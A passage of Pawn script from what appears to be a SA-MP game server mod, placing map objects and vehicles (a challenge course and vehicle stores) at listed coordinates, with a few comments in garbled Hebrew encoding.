	CreateSObject(5400, 1153.036377, -2622.506348, 28.967396, 347.9679, 0.0000, 90.0000);
	CreateSObject(5400, 1161.925049, -2622.554688, 31.810831, 343.6707, 0.0000, 90.0000);
	CreateSObject(5400, 1171.285034, -2622.555664, 34.550488, 343.6707, 0.0000, 90.0000);
	CreateSObject(5400, 1179.949951, -2622.538818, 38.262459, 338.5141, 0.0000, 90.0000);
	CreateSObject(5400, 803.781860, -2622.155029, 143.457413, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 1188.871094, -2622.531494, 41.786911, 338.5141, 0.0000, 90.0000);
	CreateSObject(5400, 1197.653076, -2622.555420, 45.241585, 338.5141, 0.0000, 90.0000);
	CreateSObject(5400, 1206.372803, -2622.554443, 49.079338, 336.7952, 0.0000, 90.0000);
	CreateSObject(5400, 1214.640747, -2622.562256, 53.641708, 332.4980, 0.0000, 90.0000);
	CreateSObject(5400, 1222.361328, -2622.541016, 58.708435, 328.2008, 0.0000, 90.0000);
	CreateSObject(5400, 1229.930298, -2622.522949, 64.280319, 324.7631, 0.0000, 90.0000);
	CreateSObject(5400, 1236.740356, -2622.563232, 70.438118, 319.6065, 0.0000, 90.0000);
	CreateSObject(5400, 1244.128296, -2622.568115, 76.724632, 319.6065, 0.0000, 90.0000);
	CreateSObject(5400, 1249.064453, -2622.540283, 82.933899, 311.8716, 0.0000, 90.0000);
	CreateSObject(5400, 1255.448120, -2622.508545, 90.059792, 311.8716, 0.0000, 90.0000);
	CreateSObject(5400, 795.671509, -2622.141602, 148.823441, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 787.555542, -2622.139893, 154.210724, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 779.637146, -2622.112793, 159.171799, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 771.919250, -2622.091064, 165.171127, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 764.233215, -2622.087158, 171.161072, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 1261.863770, -2622.495605, 97.238335, 311.8716, 0.0000, 90.0000);
	CreateSObject(5400, 756.560974, -2622.074707, 177.127747, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 748.851379, -2622.066406, 183.118408, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 741.119385, -2622.051758, 189.104385, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 733.411804, -2622.052979, 195.086365, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 725.751282, -2622.030762, 201.031631, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 718.044373, -2621.980957, 206.995056, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 710.340210, -2621.973877, 212.964828, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 702.646790, -2621.968994, 218.933594, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 694.996765, -2621.967529, 224.879944, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 687.495300, -2621.973877, 230.706924, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 679.859009, -2621.949707, 236.628662, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 672.136536, -2621.960938, 242.607162, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 664.399719, -2621.940430, 248.587219, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 656.654602, -2621.937988, 254.592010, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 648.969482, -2621.928223, 260.535370, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 641.299377, -2621.929932, 266.484924, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 633.584473, -2621.921875, 272.467102, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 625.874329, -2621.915771, 278.458740, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 618.170532, -2621.924072, 284.422302, 37.8152, 0.0000, 90.0000);
	CreateSObject(5400, 610.520752, -2621.830322, 290.456451, 36.0963, 0.0000, 90.0000);
	CreateSObject(5400, 594.874451, -2621.849121, 302.111298, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 602.030701, -2621.781494, 296.665100, 36.0963, 0.0000, 90.0000);
	CreateSObject(5400, 587.468994, -2621.841064, 307.399109, 28.3614, 0.0000, 90.0000);
	CreateSObject(5400, 579.690918, -2621.807373, 311.785095, 25.7831, 0.0000, 90.0000);
	CreateSObject(5400, 571.322815, -2621.819824, 316.040283, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 563.021118, -2621.833008, 319.636932, 19.7670, 0.0000, 90.0000);
	CreateSObject(5400, 554.071777, -2621.850098, 323.157196, 14.6104, 0.0000, 90.0000);
	CreateSObject(5400, 545.014709, -2621.859619, 325.756012, 11.1727, 0.0000, 90.0000);
	CreateSObject(5400, 536.070679, -2621.789551, 327.749207, 7.7349, 0.0000, 90.0000);
	CreateSObject(5400, 526.635864, -2621.707275, 329.241882, 5.1566, 0.0000, 90.0000);
	CreateSObject(5400, 516.990295, -2621.740967, 330.162964, 4.2972, 0.0000, 90.0000);
	CreateSObject(5400, 507.407806, -2621.725586, 330.998077, 2.5783, 0.0000, 90.0000);
	CreateSObject(5400, 498.135010, -2621.739502, 331.466370, 1.7189, 0.0000, 90.0000);
	CreateSObject(5400, 488.647430, -2621.729980, 331.857788, 0.0000, 0.0000, 90.0000);
	CreateSObject(5400, 478.979614, -2621.598633, 332.000946, 359.1406, 0.0000, 90.0000);
	CreateSObject(5400, 469.369171, -2621.489746, 332.018646, 358.2811, 0.0000, 90.0000);
	CreateSObject(5400, 605.953186, -2621.804443, 293.806335, 36.0963, 0.0000, 90.0000);
	CreateSObject(2780, 1042.746826, -2603.628418, -8.312034, 271.4781, 0.0000, 0.0000);
	CreateSObject(13641, 1262.476685, -2657.731689, 92.394127, 1.7189, 323.9037, 0.0000);
	CreateSObject(8417, 436.927307, -2657.292480, 327.543182, 0.0000, 0.0000, 90.0000);
	CreateSObject(972, 431.595825, -2640.032471, 327.501007, 0.0000, 0.0000, 90.0000);
	CreateSObject(972, 446.498352, -2640.028076, 327.501007, 0.0000, 0.0000, 90.0000);
	CreateSObject(972, 453.477661, -2640.643555, 327.501007, 0.0000, 0.0000, 0.0000);
	CreateSObject(972, 427.212952, -2674.322266, 327.501007, 0.0000, 0.0000, 270.0000);
	CreateSObject(972, 442.287537, -2674.582031, 327.501007, 0.0000, 0.0000, 270.0000);
	CreateSObject(972, 453.495636, -2678.091553, 327.501007, 0.0000, 0.0000, 0.0000);
	CreateSObject(972, 420.332916, -2663.147461, 327.501007, 0.0000, 0.0000, 180.0000);
	CreateSObject(972, 420.344330, -2647.082275, 327.501007, 0.0000, 0.0000, 180.0000);
	CreateSObject(3461, 456.184357, -2651.905029, 329.079132, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, 456.065155, -2661.864502, 329.104126, 0.0000, 0.0000, 0.0000);
	CreateSObject(640, 438.139282, -2675.128174, 328.201141, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 438.253174, -2638.090820, 328.201141, 0.0000, 0.0000, 90.0000);
	CreateSObject(647, 421.948059, -2641.070801, 329.336029, 0.0000, 0.0000, 101.2500);
	CreateSObject(870, 420.171509, -2675.257080, 327.696259, 0.0000, 0.0000, 90.0000);
	CreateSObject(3660, 419.569824, -2656.357178, 329.957245, 0.0000, 0.0000, 90.0000);
	CreateSObject(4173, 427.977966, -2653.303467, 329.567322, 0.0000, 0.0000, 90.0000);
	CreateSObject(7595, 418.827972, -2653.688232, 329.179779, 0.0000, 0.0000, 0.0000);
	CreateSObject(9812, 438.327759, -2636.500000, 328.554169, 0.0000, 0.0000, 0.0000);
	CreateSObject(3749, 456.056122, -2657.000488, 333.362549, 0.0000, 0.0000, 90.0000);
	CreateSObject(1312, 452.755859, -2662.890625, 331.828644, 0.0000, 0.0000, 90.0000);
	CreateSObject(14637, 454.427490, -2656.667969, 329.430481, 0.0000, 0.0000, 180.0000);
	CreateSObject(3471, 452.243622, -2649.262695, 328.728668, 0.0000, 0.0000, 180.0000);
	CreateSObject(3471, 452.283142, -2664.649170, 328.735596, 0.0000, 0.0000, 180.0000);
	// 0.2.0 - CTD (Yuval):
	CreateVehicleEx(424,-2407.0137,-2176.5969,33.0703,268.0386,0,0); // ct
	CreateVehicleEx(424,-2407.2896,-2180.3240,33.0696,264.4583,0,0); // ct
	CreateVehicleEx(424,-2407.7195,-2183.7532,33.0704,268.1863,0,0); // ct
	CreateVehicleEx(495,-2395.6294,-2214.3037,33.6346,328.6396,0,0); // ct
	CreateVehicleEx(495,-2400.3047,-2209.4712,33.6384,300.5271,0,0); // ct
	CreateVehicleEx(495,-2395.8149,-2198.4153,33.6341,242.8558,0,0); // ct
	CreateVehicleEx(568,-2396.1792,-2167.6360,33.1506,173.5278,0,0); // ct
	CreateVehicleEx(568,-2393.0498,-2167.9460,33.1447,171.4112,0,0); // ct
	CreateVehicleEx(568,-2389.8208,-2168.7620,33.1558,169.0805,0,0); // ct
	CreateVehicleEx(468,-2410.2932,-2172.0994,32.9581,352.7807,0,0); // ct
	CreateVehicleEx(468,-2412.3123,-2172.3425,32.9644,355.3427,0,0); // 1
	CreateVehicleEx(468,-2414.8750,-2172.3938,32.9581,359.4723,0,0); // 1
	// 0.2.0 - BChallenge (Yuval):
	CreateSObject(979, 1099.930786, -1945.261230, 42.967251, 0.0000, 0.0000, 225.0000);
	CreateSObject(979, 1095.271973, -1952.609375, 43.497124, 358.2811, 354.8434, 249.1417);
	CreateSObject(979, 1093.311646, -1961.698486, 44.604778, 0.0000, 353.1245, 264.8434);
	CreateSObject(979, 1092.990112, -1970.626587, 45.891430, 356.5623, 350.5462, 269.1406);
	CreateSObject(979, 1092.036621, -1979.537476, 46.823246, 0.0000, 357.4217, 258.7500);
	CreateSObject(979, 1090.475708, -1987.256958, 47.387989, 359.1406, 353.1245, 258.7500);
	CreateSObject(979, 1088.687378, -1994.102905, 48.138027, 351.4056, 352.2651, 251.4193);
	CreateSObject(979, 1084.776978, -2002.287354, 49.081768, 0.0000, 355.7028, 236.2501);
	CreateSObject(979, 1079.375610, -2008.910645, 49.578167, 0.0000, 358.2811, 225.0000);
	CreateSObject(18609, 1073.324097, -2024.838013, 51.772198, 0.0000, 0.0000, 258.7500);
	CreateSObject(18609, 1073.315796, -2046.769165, 53.328945, 358.2811, 356.5623, 287.3434);
	CreateSObject(18609, 1102.883545, -1945.176147, 42.762005, 0.0000, 0.0000, 225.0000);
	CreateSObject(18609, 1103.271362, -1956.418579, 43.966087, 0.0000, 0.0000, 78.7500);
	CreateSObject(18609, 1094.287354, -1965.206665, 45.029270, 0.0000, 0.0000, 270.0000);
	CreateSObject(18609, 1093.161377, -1972.770996, 45.933266, 0.0000, 0.0000, 258.7500);
	CreateSObject(18609, 1092.108765, -1983.884277, 46.871731, 0.0000, 0.0000, 247.5000);
	CreateSObject(18609, 1089.655396, -1991.700195, 48.124866, 0.0000, 0.0000, 247.5000);
	CreateSObject(18609, 1083.377686, -2004.123535, 49.495827, 0.0000, 0.0000, 247.5000);
	CreateSObject(18609, 1077.638062, -2015.586304, 50.448696, 0.0000, 0.0000, 247.5000);
	CreateSObject(18609, 1071.180420, -2033.266235, 52.313679, 0.0000, 0.0000, 258.7500);
	CreateSObject(18568, 1078.921387, -2053.115723, 53.509544, 353.9839, 336.7952, 278.7490);
	CreateSObject(18609, 1079.296753, -2068.521973, 57.771954, 0.0000, 0.0000, 292.5000);
	CreateSObject(18609, 1082.275024, -2085.046631, 61.420727, 352.2651, 3.4377, 292.5000);
	CreateSObject(18568, 1090.486206, -2104.175537, 64.816765, 359.1406, 351.4056, 270.0000);
	CreateSObject(18566, 1090.808228, -2097.127686, 63.715881, 0.0000, 2.5783, 180.0000);
	CreateSObject(18609, 1089.346436, -2116.682129, 66.338211, 0.0000, 0.0000, 281.2500);
	CreateSObject(18367, 1122.460938, -2143.804443, 71.253143, 26.6425, 359.1406, 268.3585);
	CreateSObject(991, 1126.600342, -2147.380371, 70.807533, 0.0000, 0.0000, 11.2500);
	CreateSObject(991, 1132.602173, -2145.569580, 70.376778, 0.0000, 5.1566, 22.5000);
	CreateSObject(991, 1138.600098, -2143.052979, 69.424362, 0.0000, 6.8755, 22.5000);
	CreateSObject(991, 1144.832520, -2141.145508, 68.697266, 358.2811, 0.0000, 11.2500);
	CreateSObject(16401, 1154.714478, -2136.658691, 68.155228, 0.8594, 348.8273, 11.2500);
	CreateSObject(13640, 1099.450684, -2131.478760, 67.361694, 350.5462, 357.4217, 303.7500);
	CreateSObject(18609, 1189.417114, -2127.256592, 64.940796, 0.0000, 0.0000, 0.0000);
	CreateSObject(18609, 1203.305786, -2124.333984, 62.654533, 0.0000, 0.0000, 22.5000);
	CreateSObject(1245, 1215.693237, -2116.149658, 62.362808, 356.5623, 7.7349, 207.7339);
	CreateSObject(18609, 1241.184570, -2105.782959, 57.585403, 7.7349, 0.0000, 11.2500);
	CreateSObject(7073, 1477.173096, -1968.978027, 46.231888, 0.0000, 0.0000, 303.7500);
	CreateSObject(7392, 1462.797729, -1981.088989, 32.808079, 18.0482, 358.2811, 315.0000);
	CreateSObject(7916, 1443.218140, -1974.208862, 32.639671, 0.0000, 0.0000, 112.5000);
	CreateSObject(9833, 1467.109131, -1948.304321, 28.120199, 0.0000, 0.0000, 0.0000);
	CreateSObject(18609, 1255.064819, -2103.007568, 57.120022, 0.0000, 0.0000, 0.0000);
	CreateSObject(18609, 1271.637695, -2106.452393, 56.369198, 0.0000, 0.0000, 0.0000);
	CreateSObject(18609, 1287.875977, -2108.452637, 54.165569, 0.0000, 0.0000, 0.0000);
	CreateSObject(984, 1314.164673, -2117.455322, 47.245499, 6.0161, 0.0000, 303.7500);
	CreateSObject(984, 1324.765259, -2110.518555, 48.304420, 3.4377, 0.0000, 303.7500);
	CreateSObject(984, 1335.457031, -2103.347412, 48.750782, 6.0161, 0.0000, 303.7500);
	CreateSObject(984, 1345.178345, -2095.292969, 50.350613, 6.0161, 0.0000, 315.0000);
	CreateSObject(18609, 1313.608398, -2117.227539, 47.743221, 0.0000, 0.0000, 22.5000);
	CreateSObject(18609, 1321.470215, -2111.060303, 48.826984, 0.0000, 0.0000, 22.5000);
	CreateSObject(18609, 1330.926270, -2106.113037, 49.348480, 0.0000, 0.0000, 33.7500);
	CreateSObject(18609, 1340.538940, -2098.462158, 50.436665, 0.0000, 0.0000, 45.0000);
	CreateSObject(18609, 1349.489746, -2090.848389, 51.102497, 0.0000, 0.0000, 33.7500);
	CreateSObject(18367, 1352.047485, -2089.735352, 35.891785, 336.7952, 0.0000, 96.0935);
	CreateSObject(18566, 1399.027588, -2087.761230, 43.625713, 0.0000, 0.0000, 270.0000);
	CreateSObject(18609, 1414.866211, -2093.049072, 42.978901, 0.0000, 0.0000, 0.0000);
	CreateSObject(1245, 1436.597168, -2095.145264, 38.509911, 6.0161, 12.8916, 181.7961);
	CreateSObject(18568, 1460.385254, -2089.670654, 35.159874, 0.0000, 0.0000, 11.2500);
	CreateSObject(18609, 1474.522095, -2091.049805, 33.448433, 0.0000, 0.0000, 22.5000);
	CreateSObject(18609, 1488.744385, -2086.562256, 30.354555, 3.4377, 0.0000, 45.0000);
	CreateSObject(18609, 1494.863403, -2071.590820, 27.070292, 0.0000, 0.0000, 78.7500);
	CreateSObject(18568, 1488.657349, -2060.618164, 28.652620, 0.0000, 0.0000, 281.2500);
	CreateSObject(18609, 1480.717651, -2052.288818, 30.618546, 0.0000, 0.0000, 292.5000);
	CreateSObject(16401, 1469.613525, -1974.876099, 29.253532, 0.0000, 333.3575, 123.7499);
	CreateSObject(16401, 1481.420654, -2030.699707, 29.199663, 0.0000, 0.0000, 101.2500);
	CreateSObject(18566, 1480.125488, -2011.780762, 31.851536, 0.0000, 0.0000, 0.0000);
	CreateVehicleEx(468,1238.3582,-1918.5026,30.9947,185.3827,46,46); //  àåôðåò ùèç
	CreateVehicleEx(468,1236.8384,-1917.4867,30.9040,189.7767,46,46); //  àåôðåò ùèç
	CreateVehicleEx(468,1233.9059,-1918.6697,30.9808,202.0829,46,46); //  àåôðåò ùèç
	CreateVehicleEx(468,1232.5044,-1918.9301,30.9907,192.7223,46,46); //  àåôðåò ùèç
	// 0.2.0 - Vehicles Store (Yosi):
	CreateSObject(980, 1067.413086, 1357.780151, 12.448130, 0.0000, 0.0000, 0.0000);
	CreateSObject(18232, 1052.832764, 1356.536621, 9.816298, 0.0000, 0.0000, 2.7330);
	CreateVehicleEx_Store(451,1093.0637,1355.9382,10.5272,90.2872,36,36,respawntime,0,world_normal,750000); //
	CreateVehicleEx_Store(451,1093.0637,1348.5199,10.5265,90.7375,16,16,respawntime,0,world_normal,750000); //
	CreateVehicleEx_Store(451,1093.0637,1341.8044,10.5266,90.0164,-1,-1,respawntime,0,world_normal,750000); //
	CreateVehicleEx_Store(451,1093.0637,1334.6565,10.5270,89.5697,46,46,respawntime,0,world_normal,750000); //
	CreateVehicleEx_Store(506,1093.0637,1327.8986,10.5247,90.9577,6,6,respawntime,0,world_normal,2000000); //
	CreateVehicleEx_Store(506,1093.0637,1321.5144,10.5248,89.9773,7,7,respawntime,0,world_normal,2000000); //
	CreateVehicleEx_Store(477,1093.0637,1315.5571,10.5757,89.5826,94,1,respawntime,0,world_normal,700000); //
	CreateVehicleEx_Store(477,1093.0637,1308.3389,10.5740,90.0747,101,1,respawntime,0,world_normal,700000); //
	CreateVehicleEx_Store(575,1093.0637,1301.2880,10.4226,90.2839,19,96,respawntime,0,world_normal,600000); //
	CreateVehicleEx_Store(575,1093.0637,1294.4110,10.4227,89.3763,31,64,respawntime,0,world_normal,600000); //
	CreateVehicleEx_Store(412,1093.0637,1286.4379,10.6576,89.0915,10,8,respawntime,0,world_normal,550000); //
	CreateVehicleEx_Store(412,1093.0637,1280.8849,10.6581,89.4326,11,1,respawntime,0,world_normal,550000); //
	CreateVehicleEx_Store(412,1093.0637,1274.9547,10.6576,89.4938,25,8,respawntime,0,world_normal,550000); //
	CreateVehicleEx_Store(545,1093.0637,1267.7003,10.6314,89.7536,47,1,respawntime,0,world_normal,300000); //
	CreateVehicleEx_Store(545,1093.0637,1261.7689,10.6314,89.9378,44,96,respawntime,0,world_normal,300000); //
	CreateVehicleEx_Store(434,1093.0637,1255.7855,10.7881,91.4593,12,12,respawntime,0,world_normal,3500000); //
	CreateVehicleEx_Store(434,1093.0637,1250.3778,10.7885,91.4156,2,2,respawntime,0,world_normal,3500000); //
	CreateVehicleEx_Store(567,1093.0637,1244.8761,10.6893,91.8645,88,64,respawntime,0,world_normal,800000); //
	CreateVehicleEx_Store(567,1093.0637,1239.6122,10.6850,91.1733,90,96,respawntime,0,world_normal,800000); //
	CreateVehicleEx_Store(567,1093.0637,1234.1914,10.6849,89.3010,93,64,respawntime,0,world_normal,800000); //
	CreateVehicleEx_Store(567,1093.0637,1228.5331,10.6887,90.2371,97,96,respawntime,0,world_normal,800000); //
	CreateVehicleEx_Store(411,1063.3717,1229.4501,10.5545,268.0119,123,1,respawntime,0,world_normal,1000000); //
	CreateVehicleEx_Store(411,1063.3717,1236.4019,10.5545,268.5675,116,1,respawntime,0,world_normal,1000000); //
	CreateVehicleEx_Store(411,1063.3717,1243.6489,10.5510,270.7951,112,1,respawntime,0,world_normal,1000000); //
	CreateVehicleEx_Store(411,1063.3717,1250.4214,10.5474,269.5958,106,1,respawntime,0,world_normal,1000000); //
	CreateVehicleEx_Store(536,1063.3717,1257.6813,10.5579,270.3862,12,1,respawntime,0,world_normal,720000); //
	CreateVehicleEx_Store(536,1063.3717,1263.9612,10.5579,269.9584,26,96,respawntime,0,world_normal,720000); //
	CreateVehicleEx_Store(409,1063.3717,1270.0781,10.6203,269.0928,1,1,respawntime,0,world_normal,650000); //
	CreateVehicleEx_Store(409,1063.3717,1276.9238,10.6203,268.8671,1,1,respawntime,0,world_normal,650000); //
	CreateVehicleEx_Store(421,1063.3717,1284.0204,10.7028,268.4821,13,1,respawntime,0,world_normal,400000); //
	CreateVehicleEx_Store(421,1063.3717,1288.9221,10.7028,267.7807,25,1,respawntime,0,world_normal,400000); //
	CreateVehicleEx_Store(421,1063.3717,1292.4771,10.7028,267.0210,30,1,respawntime,0,world_normal,400000); //
	CreateVehicleEx_Store(481,1037.6965,1335.9161,10.3409,259.7398,0,0,respawntime,0,world_normal,1500000); //
	CreateVehicleEx_Store(510,1037.2843,1334.0908,10.4129,255.9502,1,1,respawntime,0,world_normal,1500000); //
	CreateVehicleEx_Store(522,1053.9181,1304.6631,10.3825,359.4436,0,1,respawntime,0,world_normal,4000000); //
	CreateVehicleEx_Store(522,1050.6453,1305.2247,10.3750,355.0035,5,5,respawntime,0,world_normal,4000000); //
	CreateVehicleEx_Store(522,1048.6913,1305.3567,10.3793,351.9140,155,156,respawntime,0,world_normal,4000000); //
	CreateVehicleEx_Store(522,1046.7535,1305.8423,10.3814,1.6882,3,3,respawntime,0,world_normal,4000000); //
	CreateVehicleEx_Store(462,1033.6290,1321.8939,10.4187,245.3802,2,2,respawntime,0,world_normal,500000); //
	CreateVehicleEx_Store(462,1034.6615,1324.5159,10.4099,251.1609,3,3,respawntime,0,world_normal,500000); //
	CreateVehicleEx_Store(462,1031.9089,1319.9089,10.4122,231.7938,6,6,respawntime,0,world_normal,500000); //
	// Another store (BloWeR):
	CreateVehicleEx_Store(429,-1955.6129,256.4029,40.7217,1.0785,-1,-1,respawntime,0,world_normal,1200000); // Vstore
	CreateVehicleEx_Store(429,-1955.6129,256.4029,40.7217,1.0785,-1,-1,respawntime,0,world_normal,1200000); // Vstore
	CreateVehicleEx_Store(513,-1917.6676,282.9474,41.5998,180.1725,131,0,respawntime,0,world_normal,10000000); // Vstore
	CreateVehicleEx_Store(534,-1931.6436,242.7059,40.7682,2.0616,-1,-1,respawntime,0,world_normal,450000); // Vstore
	CreateVehicleEx_Store(500,-1896.3599,274.1000,41.1547,180.0250,1,1,respawntime,0,world_normal,300000); // Vstore
	CreateVehicleEx_Store(603,-1915.2094,207.7641,34.9943,359.0722,1,0,respawntime,0,world_normal,600000); // Vstore
	CreateVehicleEx_Store(567,-1989.6715,268.5913,35.0435,264.5946,93,64,respawntime,0,world_normal,800000); // VSTORE
	CreateVehicleEx_Store(567,-1989.6300,263.3965,35.0457,264.8373,97,96,respawntime,0,world_normal,800000); // VSTORE
	CreateVehicleEx_Store(451,-1971.3577,265.8693,34.8783,90.1124,36,36,respawntime,0,world_normal,750000); // VSTORE
	CreateVehicleEx_Store(451,-1971.6696,260.2707,34.8800,88.7323,-1,-1,respawntime,0,world_normal,750000); // VSTORE
	CreateVehicleEx_Store(451,-1971.7404,254.7266,34.8790,90.9863,-1,-1,respawntime,0,world_normal,750000); // VSTORE
	CreateVehicleEx_Store(506,-1960.4020,301.9366,35.1767,215.9381,-1,-1,respawntime,0,world_normal,2000000); // VSTORE
	CreateVehicleEx_Store(444,-1947.0781,260.6890,35.8401,40.1456,-1,-1,respawntime,0,world_normal,1000000); // VSTORE
	CreateVehicleEx_Store(442,-1923.6467,243.9177,40.8763,89.6710,-1,-1,respawntime,0,world_normal,200000); // VSTORE
	CreateVehicleEx_Store(411,-1991.2649,243.4963,34.8990,265.8309,132,132,respawntime,0,world_normal,1000000); // VSTORE
	CreateVehicleEx_Store(411,-1990.3788,254.6258,34.8990,263.7220,184,0,respawntime,0,world_normal,1000000); // VSTORE
	CreateVehicleEx_Store(560,-1961.0298,256.3305,35.1802,0.7817,-1,-1,respawntime,0,world_normal,700000); // VSTORE
	CreateVehicleEx_Store(560,-1957.8376,256.0449,35.1741,0.9024,-1,-1,respawntime,0,world_normal,700000); // VSTORE
	CreateVehicleEx_Store(560,-1953.8989,256.0450,35.1768,1.7504,-1,-1,respawntime,0,world_normal,700000); // VSTORE
	CreateVehicleEx_Store(575,-1948.1921,274.4576,35.0738,179.2651,-1,-1,respawntime,0,world_normal,600000); // VSTORE
	CreateVehicleEx_Store(575,-1944.0131,274.4477,35.0770,179.8091,-1,-1,respawntime,0,world_normal,600000); // VSTORE
	CreateVehicleEx_Store(587,-1957.4591,305.3565,40.7731,180.4339,-1,-1,respawntime,0,world_normal,300000); // VSTORE
	CreateVehicleEx_Store(587,-1953.4115,305.2511,40.7711,180.9113,-1,-1,respawntime,0,world_normal,300000); // VSTORE
	CreateVehicleEx_Store(480,-1951.9196,292.6803,40.8198,178.8556,-1,-1,respawntime,0,world_normal,900000); // VSTORE
	CreateVehicleEx_Store(480,-1948.2981,274.4642,40.8228,180.4403,-1,-1,respawntime,0,world_normal,900000); // VSTORE
	CreateVehicleEx_Store(480,-1944.3837,274.5391,40.8193,180.5703,-1,-1,respawntime,0,world_normal,900000); // VSTORE
	CreateVehicleEx_Store(559,-1956.6925,270.3662,40.7034,270.9845,-1,-1,respawntime,0,world_normal,650000); // VSTORE
	CreateVehicleEx_Store(559,-1956.3359,266.4601,40.7034,270.6534,-1,-1,respawntime,0,world_normal,650000); // VSTORE
	CreateVehicleEx_Store(559,-1956.7037,262.4371,40.7034,269.5839,-1,-1,respawntime,0,world_normal,650000); // VSTORE
	CreateVehicleEx_Store(415,-1956.6019,257.0204,40.8197,269.6206,-1,-1,respawntime,0,world_normal,450000); // VSTORE
	CreateVehicleEx_Store(415,-1945.6792,256.1082,40.8181,0.5599,-1,-1,respawntime,0,world_normal,450000); // VSTORE
	CreateVehicleEx_Store(415,-1950.8503,256.1486,40.8193,359.7068,-1,-1,respawntime,0,world_normal,450000); // VSTORE
	CreateVehicleEx_Store(471,-1957.9016,295.8572,40.5292,270.8428,-1,-1,respawntime,0,world_normal,300000); // VSTORE
	CreateVehicleEx_Store(471,-1958.0952,293.9076,40.5290,271.2036,-1,-1,respawntime,0,world_normal,300000); // VSTORE
	CreateVehicleEx_Store(471,-1958.1124,291.7757,40.5277,271.2926,-1,-1,respawntime,0,world_normal,300000); // VSTORE
	CreateVehicleEx_Store(522,-1957.6532,289.6090,40.6146,273.3191,-1,-1,respawntime,0,world_normal,4000000); // VSTORE
	CreateVehicleEx_Store(522,-1957.8699,288.2473,40.6172,272.9551,-1,-1,respawntime,0,world_normal,4000000); // VSTORE
	CreateVehicleEx_Store(522,-1957.7905,286.5645,40.6157,272.3704,-1,-1,respawntime,0,world_normal,4000000); // VSTORE
	CreateVehicleEx_Store(490,-1904.4938,207.6737,35.2787,359.9900,0,0,respawntime,0,world_normal,500000); // VSTORE
	CreateVehicleEx_Store(490,-1909.3237,207.7465,35.2828,359.1986,0,0,respawntime,0,world_normal,500000); // VSTORE
	CreateVehicleEx_Store(536,2252.8279,160.2845,26.8951,180.9793,12,1,respawntime,0,world_normal,720000); // viktor
	CreateSObject(8674, -1986.216797, 310.063263, 35.935665, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1983.637939, 310.081177, 35.910664, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1991.331909, 304.946503, 35.935665, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, -1991.303345, 303.753174, 35.977512, 0.0000, 0.0000, 90.0000);
	CreateSObject(8674, -1986.161377, 298.640228, 35.935665, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1991.281250, 238.834351, 35.935665, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1983.581177, 238.845520, 35.935665, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1996.064941, 243.827087, 35.935665, 0.0000, 0.0000, 262.1877);
	CreateSObject(8674, -1994.828247, 254.082657, 35.938808, 0.0000, 0.0000, 263.9066);
	CreateSObject(8674, -1993.884155, 264.330170, 35.937054, 0.0000, 0.0000, 265.7028);
	CreateSObject(8674, -1993.234863, 273.059967, 35.893215, 0.0000, 359.1406, 265.6255);
	CreateSObject(8674, -1987.676880, 278.191345, 35.943218, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1986.137207, 278.219330, 35.941090, 0.0000, 0.0000, 0.0000);
	CreateSObject(973, -1919.265625, 233.288513, 34.742832, 0.0000, 0.0000, 90.0000);
	CreateSObject(18232, -1916.525635, 301.000854, 40.042862, 0.0000, 0.0000, 0.0000);
	CreateSObject(14826, -1896.359619, 261.571899, 40.811253, 0.0000, 0.0000, 33.7500);
	CreateSObject(11393, -1922.732178, 248.887207, 41.571915, 0.0000, 0.0000, 0.0000);
	CreateSObject(18284, -1989.211182, 268.688324, 37.124195, 0.0000, 0.0000, 354.8434);
	CreateSObject(18284, -1990.840088, 249.171570, 37.116714, 0.0000, 0.0000, 354.8434);
	CreateSObject(18452, -1986.554199, 304.678375, 37.120605, 0.0000, 0.0000, 0.0000);
	CreateSObject(18284, -1971.674438, 260.317780, 37.116714, 0.0000, 0.0000, 0.0000);
	CreateSObject(968, -1991.909668, 285.619049, 33.615185, 0.0000, 273.1970, 266.5623);
	CreateSObject(4100, -1991.296753, 300.348145, 35.594482, 0.0000, 353.9839, 48.5151);
	CreateSObject(4100, -1992.680420, 278.048523, 33.897720, 0.0000, 354.8434, 45.0000);
	CreateSObject(966, -1991.926880, 285.741760, 32.804039, 0.0000, 3.4377, 266.5623);
	CreateSObject(3461, -1967.929688, 295.641693, 35.746887, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1968.093872, 292.219879, 35.746887, 0.0000, 0.0000, 0.0000);
	CreateSObject(3525, -1967.340210, 295.020386, 38.367001, 0.0000, 0.0000, 276.0934);
	CreateSObject(3525, -1967.306885, 292.906494, 38.425323, 0.0000, 0.0000, 270.0000);
	CreateSObject(7388, -1963.050171, 284.754089, 46.621811, 0.0000, 0.0000, 0.0000);
	CreateSObject(3460, -1983.100586, 293.948730, 38.238724, 0.0000, 0.0000, 90.0000);
